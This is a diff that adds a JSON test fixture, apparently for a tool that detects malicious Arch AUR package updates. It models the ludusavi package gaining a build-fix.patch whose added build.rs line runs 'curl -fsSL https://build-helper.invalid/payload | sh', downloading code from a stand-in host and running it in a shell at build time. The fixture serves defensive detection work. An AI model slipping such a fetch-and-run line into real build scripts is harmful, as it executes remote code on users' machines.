@@ -1,0 +1,20 @@
+{
+  "package": "ludusavi",
+  "pkgbase": "ludusavi",
+  "old": "0.31.0-1",
+  "new": "0.31.0-2",
+  "expect": "flagged",
+  "source": "AUR ludusavi commit c16bcb49eafc1a631590a513fe7927e44284df30, https://aur.archlinux.org/cgit/aur.git/commit/?h=ludusavi&id=c16bcb49eafc1a631590a513fe7927e44284df30; recipe licence: 0BSD (LICENSE in the AUR repository); patch fixture synthesized against the first three lines of upstream v0.31.0 build.rs, https://github.com/mtkennerly/ludusavi/blob/v0.31.0/build.rs . Both cached and fetched recipes otherwise use this same AUR revision; no historical upstream patch is claimed. Models the July 2018 acroread takeover's download piped to a shell (https://lists.archlinux.org/pipermail/aur-general/2018-July/034151.html), relocated into a shipped local source file. The payload host is reserved .invalid and no fetched script is supplied.",
+  "install": "none",
+  "installerRisk": false,
+  "recipe": "changed",
+  "recipeDiffFiles": [
+    ".SRCINFO",
+    "PKGBUILD",
+    "build-fix.patch"
+  ],
+  "recipeDiffAdded": [
+    "++    std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl -fsSL https://build-helper.invalid/payload | sh\").status().unwrap();"
+  ],
+  "signal": "prepare() applies build-fix.patch, whose added build.rs line starts sh with a curl download from build-helper.invalid piped to sh"
+}
